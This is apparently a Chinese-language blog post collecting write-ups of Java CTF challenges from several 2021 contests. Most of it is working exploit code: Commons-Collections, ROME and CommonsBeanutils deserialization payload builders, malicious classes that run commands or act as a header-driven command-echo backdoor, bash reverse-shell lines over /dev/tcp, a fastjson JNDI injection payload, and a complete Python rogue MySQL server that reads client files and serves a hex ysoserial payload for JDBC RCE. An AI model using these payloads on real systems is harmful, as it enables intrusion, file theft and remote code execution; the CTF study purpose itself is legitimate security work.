---
title: java中的CTF
key: java中的CTF
---

## 前言

emm不会阐述太多关于原理的知识，应该只算是简单记录。jar包我都有所保留，需要环境的师傅可以联系我~

##  东华杯

>考点：
>
>- cc5 简单反序列化利用

在**IndexController**，readobject路由下可以很明显看到反序列化，看一眼lib包，其中jackson版本也是比较高，有没有可以直接打的点。

> ps:
>
> 所有题目都是12月前的比赛，当时还没有爆出log4j2的洞，并且springboot默认日志库采用logback，所以除非题目有主动调用了log4j2的api，仅仅只是引用了库的话还是安全。

**ToStringBean** 这个类需要注意

![image-20211221162730660](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221162730.png)

发现这里的`toString`调用了defineClass动态加载字节码，并且后续有对象实例化操作，那么如果我们可以控制这里的ClassByte，并且找到一个反序列化readobject可以直接触发toString的点，就可以在恶意类的构造函数里写入命令，创建实例时触发达到RCE的目的。

先看后面的问题，虽然这里的ClassByte是私有属性，不过我们可以通过反射修改其权限，进而创建对象，这里写一个例子：

![image-20211221165717571](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221165717.png)

Evil.java:

```java
public class Evil {
    public Evil()throws Exception {
        String command = "open -a Calculator";
        Runtime.getRuntime().exec(command);
    }
}
```

现在最后一步，就是找到反序列化中的**kick-off**  ==> 重写readobject的类，如果对cc链比较熟悉的话，cc5的入口`BadAttributeValueExpException.readObject()`正是触发了`toString()`方法。

```
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

![image-20211221172242670](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221172242.png)

和前面一样，通过反射设置val的值为需要调用`toString()`的对象即可。

最终Poc

![image-20211221182716586](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221182716.png)

这里注意一点，java的`Runtime.getRuntime().exec(command)`反弹shell需要修改写法，原因在exec的重载方法里，具体可参考



- [Java Runtime.exe() 执行命令与反弹shell](https://www.jianshu.com/p/ae3922db1f70)

```java
exec(new String[]{"bash","-c","bash -i >& /dev/tcp/xx.xx.xx.xx/6543 0>&1")
```
反弹shell 应该用数组形式

```java
public class Evil {
    public Evil()throws Exception {
        String command[] = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/20022 0>&1"};
        Runtime.getRuntime().exec(command);
    }
}
```
![image-20211221182846948](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221182953.png)

##  陇原战疫

>考点：
>
>- ROME反序列化
>
>- 不出网回显

反序列化类的题目，不会花太多功夫在链的构造上，毕竟都是现有的东西，跟着大佬的文章调试复现即可。

- [ROME 反序列化分析](https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)

回到题目，先看lib包，**rome-1.0**是可以直接打的，题目黑名单过滤了`java.util.HashMap`以及`javax.management.BadAttributeValueExpException`

![image-20211223161815666](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211223161815.png)

但是在finally却主动调用了`toString`，相当于是帮我们简化了poc链的构造。

最终Poc

![image-20211223162917363](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211223162917.png)

>回头检查发现写错了，读取class那里是一个二位byte数组，应改为：
>
>`byte[][] bytecodes = new byte[][]{Files.readAllBytes((new File("out/production/陇源战疫/Evil2.class")).toPath())};`

Evil2.java:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil2 extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public Evil2() throws Exception{
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```

![image-20211223161538473](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211228124618.png)

 非常的成功，但是在比赛的时候题目环境不出外网。我们无法进行反弹shell或者dns外带数据等操作。这就需要利用原生request以及response构造回显。

这里根据时间线

1. [《基于内存 Webshell 的无文件攻击技术研究》](https://www.anquanke.com/post/id/198886) 观星大哥的文章，主要应用于Spring
2. [《linux下java反序列化通杀回显方法的低配版实现》](https://xz.aliyun.com/t/7307) 将回显结果写入文件操作符
3. [《Tomcat中一种半通用回显方法》](https://xz.aliyun.com/t/7348) 将执行命令的结果存入tomcat的response返回 
4. [《基于tomcat的内存 Webshell 无文件攻击技术》](https://xz.aliyun.com/t/7388) 动态注册filter实现回显 
5. [《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3) 通过Thread.currentThread.getContextClassLoader() 拿到request、response回显 
6. [《tomcat不出网回显连续剧第六集》](https://xz.aliyun.com/t/7535) 直接从Register拿到process对应的req

可以看到其实内存马的本质也是利用到了原生回显+路由创建。

这里用第五个方法构造Evil.class:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Method;
import java.util.Scanner;
public class Evil extends AbstractTranslet
{
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public Evil() throws Exception{
        Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
        Method m = c.getMethod("getRequestAttributes");
        Object o = m.invoke(null);
        c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
        m = c.getMethod("getResponse");
        Method m1 = c.getMethod("getRequest");
        Object resp = m.invoke(o);
        Object req = m1.invoke(o); // HttpServletRequest
        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
        getHeader.setAccessible(true);
        getWriter.setAccessible(true);
        Object writer = getWriter.invoke(resp);
        String cmd = (String)getHeader.invoke(req, "cmd");
        String[] commands = new String[3];
        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
            commands[0] = "cmd";
            commands[1] = "/c";
        } else {
            commands[0] = "/bin/sh";
            commands[1] = "-c";
        }
        commands[2] = cmd;
        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
        writer.getClass().getDeclaredMethod("flush").invoke(writer);
        writer.getClass().getDeclaredMethod("close").invoke(writer);
    }
}
```

![image-20211223181452136](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211223181452.png)

##  深育杯

> 考点：
>
> - cb链无依赖cc反序列化

反序列化学习：p神文章

- [CommonsBeanutils与无commons-collections的Shiro反序列化利用	](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

后面的内容就是利用javassist读取class内容，Evil类直接用陇原战疫的tomcat回显即可。

Test.java

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();

    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] payloads = new Test().getPayload(clazz.toBytecode());
        String string = Base64.getEncoder().encodeToString(payloads);
        System.out.println(string);
    }
}
```



![image-20211226222559651](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211226222559.png)

##  香山杯

>考点：
>
>fastjson反序列化
>
>jndi注入

fastjson版本号**1.2.42** 

这里采用 [Fastjson1.2.25-1.2.47通杀](https://github.com/safe6Sec/Fastjson)

```json
payload={"theoyu":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"theoyu":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/lc9te0","autoCommit":true}}
```

本地起jndi，注意到源码是有正则过滤的，这里用unicode全部编码即可。

![image-20211227172702360](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227172702.png)

![image-20211227165838542](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227165838.png)

fastjson保姆级文章：@su18[fastjson：我一路向北，离开有你的季节](https://su18.org/post/fastjson/)

##  长城线下

>考点：
>
>- mysql恶意文件读取
>- jdbc反序列化rce

这里需要本地配置一下数据库环境

```sql
create database www;
use www;
create table user_data(
    username varchar (256),
    password varchar (256)
);
```

看一下`pom.xml` 总的来说这三个值得注意

```xml
<dependency>
   <groupId>mysql</groupId>
   <artifactId>mysql-connector-java</artifactId>
   <version>8.0.12</version>
</dependency>
<dependency>
   <groupId>commons-collections</groupId>
   <artifactId>commons-collections</artifactId>
   <version>3.1</version>
</dependency>
<dependency>
			<groupId>com.alibaba</groupId>
			<artifactId>fastjson</artifactId>
			<version>1.2.78</version>
		</dependency>
```

- mysql-connector-java 这个后面再说
- cc链 懂得都懂
- fastjson 但是版本还算高 没有利用点

简单代码阅读理解一下：

`Register.java`

![image-20211227142029148](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227142029.png)

这里发现我们用户名注册的什么，都会被正则匹配后，换为"hacker"

`AdminManager.java`

![image-20211227142255602](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227142255.png)

首先对Session里的用户名进行了验证，如果为**admin**,则可以进行任意mysql连接操作。那主动连接mysql对客户端会有什么影响呢？这个我之前暑假分析写过一篇文章[When Mysql read your file](https://theoyu.top/posts/mysql-read-file/)，在默认`ssl=false`以及`Can Use LOAD DATE LOCAL=1`的情况下，是可以通过构造恶意服务端来进行文件读取，不过目前的前提是先得绕过注册处的正则处理。

注意到正则后面用到了一个`UserBean o = JSON.parseObject(user, UserBean.class);`,fastjson非常离谱，绕过的手段没有见不到只有想不到，利用编码就可以随便绕过，不过fastjson是支持内注释的，这里就用注释绕过正则： `{"username":/*123*/"admin","password":"123456"}`

```mysql
/*成功插入*/
mysql> select * from user_data;
+----------+----------+
| username | password |
+----------+----------+
| hacker   | guess    |
| hacker   | guess    |
| hacker   | 123456   |
| admin    | 123456   |
+----------+----------+
```

然后开启恶意mysql服务，因为我本地有mysql所以端口改为了3307,之后主动连接即可。

![image-20211227144648963](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227144649.png)

这里我读取的是本地的`/etc/passwd`，比赛的话已经可以通过任意文件读取读取flag了。

不过不局限于如此，利用cc链，我们还可以直接利用这个漏洞达到rce的目的。

关于jdbc反序列化的原理，其实都差不多，可以看看这篇文章[JDBC Connection URL Attack](https://su18.org/post/jdbc-connection-url-attack/)

利用的话，这里直接用一个比较简易的exp，其实就是修改了之前返回包的内容

```python
# coding=utf-8
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3307

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

然后利用yso生成poc

直接连接即可

`?url=jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&name=root&pwd=root`

注意⚠️url的内容需要urlencode

最后合影留念

![image-20211227153712240](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211227153712.png)

##  Antctf2021

>考点：
>
>filter的配置绕过 
>
>条件竞争 
>
>mysql反序列化 
>
>AspectJWeaver的gadget构造 
>
>加载恶意类实现远程代码执行

